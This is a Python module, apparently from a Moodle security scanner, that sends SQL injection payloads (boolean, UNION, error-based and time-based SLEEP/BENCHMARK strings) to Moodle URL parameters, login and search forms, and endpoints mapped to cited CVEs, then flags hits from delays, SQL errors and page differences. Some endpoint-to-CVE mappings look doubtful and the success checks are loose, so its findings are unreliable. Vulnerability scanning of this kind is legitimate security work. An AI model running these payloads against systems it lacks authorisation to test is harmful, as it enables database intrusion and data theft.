#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module for testing SQL injection vulnerabilities in Moodle
Part of the Moodle Security Scanner project
"""

import re
import requests
import logging
import time
import urllib.parse
from bs4 import BeautifulSoup

class MoodleSQLITester:
    """Class for testing SQL injection vulnerabilities in Moodle"""
    
    def __init__(self, target_url, logger=None, timeout=30, proxy=None, cookies=None, delay=0):
        """Initialize the Moodle SQL injection tester"""
        self.target_url = target_url
        self.timeout = timeout
        self.proxy = proxy
        self.cookies = cookies
        self.delay = delay
        self.version_info = None
        
        # SQL injection payloads for testing
        self.sqli_payloads = [
            # Boolean-based blind
            "' OR 1=1 -- ",
            "' OR '1'='1",
            "1' OR '1'='1' -- ",
            "1 OR 1=1",
            # Error-based
            "' OR 1=1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) -- ",
            "' UNION SELECT 1,@@version,3,4 -- ",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- ",
            # UNION-based
            "' UNION SELECT 1,2,3,4 -- ",
            "' UNION SELECT 1,2,3,4,5 -- ",
            "' UNION SELECT NULL,NULL,NULL,NULL -- ",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
            # Time-based blind
            "' OR SLEEP(5) -- ",
            "' AND SLEEP(5) -- ",
            "' AND (SELECT 5000 FROM (SELECT SLEEP(5))a) -- ",
            # MySQL specific
            "' OR BENCHMARK(1000000,MD5('A')) -- ",
            "' OR IF(1=1, SLEEP(5), 0) -- "
        ]
        
        # Parameters commonly vulnerable to SQL injection
        self.sqli_params = [
            "id", "userid", "user_id", "courseid", "course_id", "groupid", "group_id", 
            "forumid", "forum_id", "threadid", "thread_id", "topicid", "topic_id", 
            "questionid", "question_id", "moduleid", "module_id", "itemid", "item_id", 
            "viewid", "view_id", "cmid", "cm_id", "section", "category", "grade", 
            "type", "page", "sort", "order", "search", "query"
        ]
        
        # Set up logging
        if logger:
            self.logger = logger
        else:
            self.logger = logging.getLogger("MoodleSQLITester")
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # Initialize HTTP session
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        if cookies:
            self.session.cookies.update(cookies)
    
    def set_version_info(self, version_info):
        """Set version information to guide testing"""
        self.version_info = version_info
    
    def run_tests(self):
        """
        Run all SQL injection tests
        Returns a dictionary with results information
        """
        self.logger.info("Running SQL injection vulnerability tests...")
        
        results = {
            "vulnerabilities": [],
            "info": []
        }
        
        # Test GET parameters for SQL injection
        get_vulns = self.test_get_sqli()
        if get_vulns:
            results["vulnerabilities"].extend(get_vulns)
        
        # Test POST forms for SQL injection
        post_vulns = self.test_post_sqli()
        if post_vulns:
            results["vulnerabilities"].extend(post_vulns)
        
        # Test version-specific SQL injection vulnerabilities
        if self.version_info and self.version_info.get("version"):
            version = self.version_info.get("version")
            version_vulns = self.test_version_specific_sqli(version)
            if version_vulns:
                results["vulnerabilities"].extend(version_vulns)
        
        self.logger.info(f"SQL injection vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities.")
        return results
    
    def test_get_sqli(self):
        """
        Test for SQL injection vulnerabilities in GET parameters
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for SQL injection vulnerabilities in GET parameters...")
        
        vulnerabilities = []
        
        # Common endpoints that might be vulnerable to SQL injection
        potential_targets = [
            "/course/view.php",
            "/user/view.php",
            "/user/index.php",
            "/mod/forum/view.php",
            "/mod/forum/discuss.php",
            "/mod/quiz/view.php",
            "/mod/quiz/attempt.php",
            "/grade/report/user/index.php",
            "/question/edit.php",
            "/question/question.php",
            "/blocks/recent_activity/index.php",
            "/calendar/view.php"
        ]
        
        # Test each target endpoint with each parameter and payload combination
        for target in potential_targets:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{target}"
            
            try:
                # First check if the page is accessible
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code not in [200, 301, 302]:
                    self.logger.debug(f"Skipping {target} - Status: {response.status_code}")
                    continue
                
                # Extract parameters from the URL if redirected or contains links
                additional_params = self._extract_url_params(response.text)
                if additional_params:
                    self.sqli_params.extend(additional_params)
                
                # Use time-based tests as our first pass (more reliable for blind detection)
                time_based_payloads = [payload for payload in self.sqli_payloads if "SLEEP" in payload or "BENCHMARK" in payload]
                
                # Test each parameter with time-based payloads first
                for param in set(self.sqli_params):
                    # First, try a normal request to get baseline
                    baseline_value = "1"
                    baseline_params = {param: baseline_value}
                    
                    try:
                        start_time = time.time()
                        baseline_response = self.session.get(url, params=baseline_params, timeout=self.timeout)
                        baseline_duration = time.time() - start_time
                        
                        # If parameter works, test it with payloads
                        if baseline_response.status_code in [200, 301, 302]:
                            # First try time-based payloads
                            for payload in time_based_payloads:
                                if self.delay > 0:
                                    time.sleep(self.delay)
                                
                                params = {param: payload}
                                
                                try:
                                    start_time = time.time()
                                    response = self.session.get(url, params=params, timeout=self.timeout + 10)
                                    duration = time.time() - start_time
                                    
                                    # If response took significantly longer, we might have a time-based SQL injection
                                    if duration > baseline_duration + 4:  # 4 seconds buffer for SLEEP(5)
                                        self.logger.warning(f"Potential time-based SQL injection on {target} with parameter {param}")
                                        
                                        vulnerabilities.append({
                                            "title": "Time-based SQL Injection Vulnerability",
                                            "description": f"The {target} endpoint is vulnerable to time-based SQL injection via the {param} parameter.",
                                            "severity": "Critical",
                                            "evidence": f"Payload: {payload}\nBaseline duration: {baseline_duration:.2f}s\nVulnerable duration: {duration:.2f}s",
                                            "payload": payload,
                                            "url": f"{url}?{param}={urllib.parse.quote(payload)}",
                                            "remediation": "Use parameterized queries or ORM with proper input validation."
                                        })
                                        
                                        # Found a vulnerability, try other parameters
                                        break
                                        
                                except requests.Timeout:
                                    # Timeout can also indicate successful time-based SQL injection
                                    self.logger.warning(f"Request timeout for {target} with parameter {param}, might indicate successful time-based SQL injection")
                                    
                                    vulnerabilities.append({
                                        "title": "Time-based SQL Injection Vulnerability",
                                        "description": f"The {target} endpoint is vulnerable to time-based SQL injection via the {param} parameter.",
                                        "severity": "Critical",
                                        "evidence": f"Payload: {payload}\nRequest timed out after {self.timeout} seconds, suggesting successful time-based SQL injection.",
                                        "payload": payload,
                                        "url": f"{url}?{param}={urllib.parse.quote(payload)}",
                                        "remediation": "Use parameterized queries or ORM with proper input validation."
                                    })
                                    
                                    # Found a vulnerability, try other parameters
                                    break
                                except Exception as e:
                                    self.logger.debug(f"Error testing {url} with parameter {param}: {str(e)}")
                            
                            # If no time-based vulnerabilities found, try error-based and boolean-based payloads
                            if not any(vuln for vuln in vulnerabilities if vuln["url"].startswith(url) and f"parameter {param}" in vuln["description"]):
                                other_payloads = [p for p in self.sqli_payloads if p not in time_based_payloads]
                                
                                for payload in other_payloads[:5]:  # Limit to first 5 non-time-based payloads to reduce test volume
                                    if self.delay > 0:
                                        time.sleep(self.delay)
                                    
                                    params = {param: payload}
                                    
                                    try:
                                        response = self.session.get(url, params=params, timeout=self.timeout)
                                        
                                        # Check for signs of successful SQL injection
                                        if self._check_sqli_success(response.text, baseline_response.text):
                                            self.logger.warning(f"Potential SQL injection on {target} with parameter {param}")
                                            
                                            vulnerabilities.append({
                                                "title": "SQL Injection Vulnerability",
                                                "description": f"The {target} endpoint is vulnerable to SQL injection via the {param} parameter.",
                                                "severity": "Critical",
                                                "evidence": f"Payload: {payload}\nResponse indicates successful SQL injection.",
                                                "payload": payload,
                                                "url": f"{url}?{param}={urllib.parse.quote(payload)}",
                                                "remediation": "Use parameterized queries or ORM with proper input validation."
                                            })
                                            
                                            # Found a vulnerability, try other parameters
                                            break
                                    except Exception as e:
                                        self.logger.debug(f"Error testing {url} with parameter {param}: {str(e)}")
                    except Exception as e:
                        self.logger.debug(f"Error testing baseline for {url} with parameter {param}: {str(e)}")
            except Exception as e:
                self.logger.debug(f"Error accessing {url}: {str(e)}")
        
        return vulnerabilities
    
    def test_post_sqli(self):
        """
        Test for SQL injection vulnerabilities in POST forms
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for SQL injection vulnerabilities in POST forms...")
        
        vulnerabilities = []
        
        # Common endpoints with forms that might be vulnerable to SQL injection
        potential_targets = [
            "/login/index.php",
            "/login/forgot_password.php",
            "/user/editadvanced.php",
            "/user/profile.php",
            "/course/search.php",
            "/mod/forum/search.php",
            "/admin/user.php"
        ]
        
        # Test each target form
        for target in potential_targets:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{target}"
            
            try:
                # First check if the page is accessible
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code != 200:
                    self.logger.debug(f"Skipping {target} - Status: {response.status_code}")
                    continue
                
                # Extract form information
                form_data = self._extract_form_data(response.text)
                if not form_data:
                    self.logger.debug(f"No form found on {target}")
                    continue
                
                # Test each text input field with SQL injection payloads
                for field_name, field_type in form_data["fields"].items():
                    if field_type in ["text", "hidden", "password"]:
                        # First, establish a baseline to compare against
                        baseline_data = form_data["data"].copy()
                        baseline_data[field_name] = "test123"
                        
                        try:
                            start_time = time.time()
                            baseline_response = self.session.post(form_data["action"], data=baseline_data, timeout=self.timeout)
                            baseline_duration = time.time() - start_time
                            
                            # Now test with SQL injection payloads
                            # Use time-based tests as our first pass
                            time_based_payloads = [payload for payload in self.sqli_payloads if "SLEEP" in payload or "BENCHMARK" in payload]
                            
                            for payload in time_based_payloads:
                                if self.delay > 0:
                                    time.sleep(self.delay)
                                
                                test_data = form_data["data"].copy()
                                test_data[field_name] = payload
                                
                                try:
                                    start_time = time.time()
                                    response = self.session.post(form_data["action"], data=test_data, timeout=self.timeout + 10)
                                    duration = time.time() - start_time
                                    
                                    # If response took significantly longer, we might have a time-based SQL injection
                                    if duration > baseline_duration + 4:  # 4 seconds buffer for SLEEP(5)
                                        self.logger.warning(f"Potential time-based SQL injection in form on {target} with field {field_name}")
                                        
                                        vulnerabilities.append({
                                            "title": "Time-based SQL Injection Vulnerability",
                                            "description": f"The form on {target} is vulnerable to time-based SQL injection via the {field_name} field.",
                                            "severity": "Critical",
                                            "evidence": f"Payload: {payload}\nBaseline duration: {baseline_duration:.2f}s\nVulnerable duration: {duration:.2f}s",
                                            "payload": payload,
                                            "url": form_data["action"],
                                            "field": field_name,
                                            "method": "POST",
                                            "remediation": "Use parameterized queries or ORM with proper input validation."
                                        })
                                        
                                        # Found a vulnerability, try other fields
                                        break
                                except requests.Timeout:
                                    # Timeout can also indicate successful time-based SQL injection
                                    self.logger.warning(f"Request timeout for form on {target} with field {field_name}, might indicate successful time-based SQL injection")
                                    
                                    vulnerabilities.append({
                                        "title": "Time-based SQL Injection Vulnerability",
                                        "description": f"The form on {target} is vulnerable to time-based SQL injection via the {field_name} field.",
                                        "severity": "Critical",
                                        "evidence": f"Payload: {payload}\nRequest timed out after {self.timeout} seconds, suggesting successful time-based SQL injection.",
                                        "payload": payload,
                                        "url": form_data["action"],
                                        "field": field_name,
                                        "method": "POST",
                                        "remediation": "Use parameterized queries or ORM with proper input validation."
                                    })
                                    
                                    # Found a vulnerability, try other fields
                                    break
                                except Exception as e:
                                    self.logger.debug(f"Error testing form on {target} with field {field_name}: {str(e)}")
                            
                            # If no time-based vulnerabilities found, try error-based and boolean-based payloads
                            if not any(vuln for vuln in vulnerabilities if vuln["url"] == form_data["action"] and vuln.get("field") == field_name):
                                other_payloads = [p for p in self.sqli_payloads if p not in time_based_payloads]
                                
                                for payload in other_payloads[:5]:  # Limit to first 5 non-time-based payloads to reduce test volume
                                    if self.delay > 0:
                                        time.sleep(self.delay)
                                    
                                    test_data = form_data["data"].copy()
                                    test_data[field_name] = payload
                                    
                                    try:
                                        response = self.session.post(form_data["action"], data=test_data, timeout=self.timeout)
                                        
                                        # Check for signs of successful SQL injection
                                        if self._check_sqli_success(response.text, baseline_response.text):
                                            self.logger.warning(f"Potential SQL injection in form on {target} with field {field_name}")
                                            
                                            vulnerabilities.append({
                                                "title": "SQL Injection Vulnerability",
                                                "description": f"The form on {target} is vulnerable to SQL injection via the {field_name} field.",
                                                "severity": "Critical",
                                                "evidence": f"Payload: {payload}\nResponse indicates successful SQL injection.",
                                                "payload": payload,
                                                "url": form_data["action"],
                                                "field": field_name,
                                                "method": "POST",
                                                "remediation": "Use parameterized queries or ORM with proper input validation."
                                            })
                                            
                                            # Found a vulnerability, try other fields
                                            break
                                    except Exception as e:
                                        self.logger.debug(f"Error testing form on {target} with field {field_name}: {str(e)}")
                        except Exception as e:
                            self.logger.debug(f"Error testing baseline for form on {target} with field {field_name}: {str(e)}")
            except Exception as e:
                self.logger.debug(f"Error accessing {url}: {str(e)}")
        
        return vulnerabilities
    
    def test_version_specific_sqli(self, version):
        """
        Test for SQL injection vulnerabilities specific to the detected Moodle version
        Returns a list of found vulnerabilities
        """
        self.logger.info(f"Testing for version-specific SQL injection vulnerabilities in Moodle {version}...")
        
        vulnerabilities = []
        
        # Check for specific known SQL injection vulnerabilities based on version
        known_vulnerabilities = {
            # Format: 'version pattern': [{'endpoint': '/path', 'param': 'param_name', 'payload': 'sqli_payload', 'cve': 'CVE-ID'}]
            "3.9": [
                {
                    "endpoint": "/lib/tests/weblib_test.php",
                    "param": "id",
                    "payload": "1' OR 1=1 -- ",
                    "cve": "CVE-2020-14432"
                }
            ],
            "3.10": [
                {
                    "endpoint": "/grade/report/grader/index.php",
                    "param": "id",
                    "payload": "1' OR SLEEP(5) -- ",
                    "cve": "CVE-2021-36393"
                }
            ],
            "3.11": [
                {
                    "endpoint": "/cohort/index.php",
                    "param": "contextid",
                    "payload": "1' UNION SELECT 1,@@version,3,4 -- ",
                    "cve": "CVE-2021-32478"
                }
            ],
            "4.0": [
                {
                    "endpoint": "/blocks/timeline/amd/view.php",
                    "param": "courseid",
                    "payload": "1' OR '1'='1",
                    "cve": "CVE-2022-0326"
                }
            ]
        }
        
        # Find matching vulnerabilities for the detected version
        for ver_pattern, vulns in known_vulnerabilities.items():
            if version.startswith(ver_pattern):
                self.logger.info(f"Found potential SQL injection vulnerabilities for Moodle {ver_pattern}")
                
                for vuln in vulns:
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
                    url = f"{self.target_url}{vuln['endpoint']}"
                    params = {vuln['param']: vuln['payload']}
                    
                    try:
                        # First try with a harmless parameter value to get a baseline
                        baseline_params = {vuln['param']: "1"}
                        baseline_response = self.session.get(url, params=baseline_params, timeout=self.timeout)
                        
                        if baseline_response.status_code == 200:
                            # Now try with the SQL injection payload
                            response = self.session.get(url, params=params, timeout=self.timeout)
                            
                            # Check for signs of successful SQL injection
                            if self._check_sqli_success(response.text, baseline_response.text):
                                self.logger.warning(f"Potential version-specific SQL injection found on {vuln['endpoint']} (CVE: {vuln['cve']})")
                                
                                vulnerabilities.append({
                                    "title": f"SQL Injection Vulnerability (CVE: {vuln['cve']})",
                                    "description": f"The {vuln['endpoint']} endpoint is vulnerable to SQL injection via the {vuln['param']} parameter.",
                                    "severity": "Critical",
                                    "evidence": f"Payload: {vuln['payload']}\nURL: {url}?{vuln['param']}={urllib.parse.quote(vuln['payload'])}",
                                    "payload": vuln['payload'],
                                    "url": f"{url}?{vuln['param']}={urllib.parse.quote(vuln['payload'])}",
                                    "cve": vuln['cve'],
                                    "remediation": "Update to the latest Moodle version or apply the security patch."
                                })
                    except Exception as e:
                        self.logger.debug(f"Error testing version-specific SQL injection on {vuln['endpoint']}: {str(e)}")
        
        return vulnerabilities
    
    def _extract_url_params(self, html_content):
        """Extract URL parameters from links in the HTML content"""
        params = []
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Extract parameters from links
            for link in soup.find_all('a'):
                href = link.get('href', '')
                if '?' in href:
                    query_part = href.split('?')[1]
                    for param_pair in query_part.split('&'):
                        if '=' in param_pair:
                            param_name = param_pair.split('=')[0]
                            if param_name and param_name not in params:
                                params.append(param_name)
        except Exception as e:
            self.logger.debug(f"Error extracting URL parameters: {str(e)}")
        
        return params
    
    def _extract_form_data(self, html_content):
        """Extract form data including action URL and all fields with their types"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Find the first form
            form = soup.find('form')
            if not form:
                return None
            
            # Get form action
            action = form.get('action', '')
            if not action.startswith('http'):
                action = urllib.parse.urljoin(self.target_url, action)
            
            # Get all form fields
            fields = {}
            data = {}
            
            inputs = form.find_all(['input', 'textarea', 'select'])
            for input_elem in inputs:
                if input_elem.has_attr('name'):
                    name = input_elem['name']
                    input_type = input_elem.get('type', 'text') if input_elem.name == 'input' else input_elem.name
                    fields[name] = input_type
                    
                    # Add default value if present
                    if input_elem.has_attr('value'):
                        data[name] = input_elem['value']
                    elif input_type == 'textarea':
                        data[name] = input_elem.string or ''
                    else:
                        data[name] = ''
            
            return {
                "action": action,
                "fields": fields,
                "data": data
            }
        except Exception as e:
            self.logger.debug(f"Error extracting form data: {str(e)}")
            return None
    
    def _check_sqli_success(self, vulnerable_text, baseline_text):
        """
        Check if the SQL injection attempt was successful by comparing responses
        Returns True if the injection seems successful, False otherwise
        """
        # If the responses are significantly different, the injection might have been successful
        # This is a simplistic approach and might produce false positives/negatives
        
        # Check for SQL error messages that might indicate successful injection
        error_patterns = [
            r'SQL syntax',
            r'syntax error',
            r'mysql error',
            r'ORA-[0-9]+',
            r'PostgreSQL error',
            r'sqlite3.OperationalError',
            r'DB2 SQL error',
            r'unclosed quotation',
            r'unterminated string',
            r'division by zero',
            r'supplied argument is not a valid MySQL',
            r'You have an error in your SQL syntax',
            r'Warning: mysql_',
            r'function\.mysql',
            r'MySQL result index',
            r'MySQL Error',
            r'pg_query\(\) \[:'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, vulnerable_text, re.IGNORECASE) and not re.search(pattern, baseline_text, re.IGNORECASE):
                return True
        
        # Check for success indicators like version strings, data dumps, etc.
        success_patterns = [
            r'MySQL',
            r'MariaDB',
            r'PostgreSQL',
            r'SQLite',
            r'Microsoft SQL Server',
            r'Oracle Database',
            r'DB2',
            r'[0-9]+\.[0-9]+\.[0-9]+',  # Version number pattern
            r'root@',
            r'mysql@',
            r'database_name',
            r'table_name',
            r'INFORMATION_SCHEMA'
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, vulnerable_text, re.IGNORECASE) and not re.search(pattern, baseline_text, re.IGNORECASE):
                return True
        
        # Also check if there are significant structural changes in the HTML
        if self._compare_html_structure(vulnerable_text, baseline_text):
            return True
        
        return False
    
    def _compare_html_structure(self, html1, html2):
        """
        Compare two HTML structures to see if there are significant differences
        Returns True if significant differences are found, False otherwise
        """
        try:
            soup1 = BeautifulSoup(html1, 'html.parser')
            soup2 = BeautifulSoup(html2, 'html.parser')
            
            # Compare number of tables (SQL injection might expose additional tables)
            tables1 = len(soup1.find_all('table'))
            tables2 = len(soup2.find_all('table'))
            if abs(tables1 - tables2) > 0:
                return True
            
            # Compare number of rows in tables
            rows1 = len(soup1.find_all('tr'))
            rows2 = len(soup2.find_all('tr'))
            if abs(rows1 - rows2) > 3:  # Allow small differences
                return True
            
            # Compare number of links (might be significantly different if data structure changes)
            links1 = len(soup1.find_all('a'))
            links2 = len(soup2.find_all('a'))
            if abs(links1 - links2) > 5:  # Allow small differences
                return True
            
            # Compare page titles (might change in case of error or different data)
            title1 = soup1.title.string if soup1.title else ""
            title2 = soup2.title.string if soup2.title else ""
            if title1 != title2:
                return True
            
            return False
        except Exception as e:
            self.logger.debug(f"Error comparing HTML structures: {str(e)}")
            return False 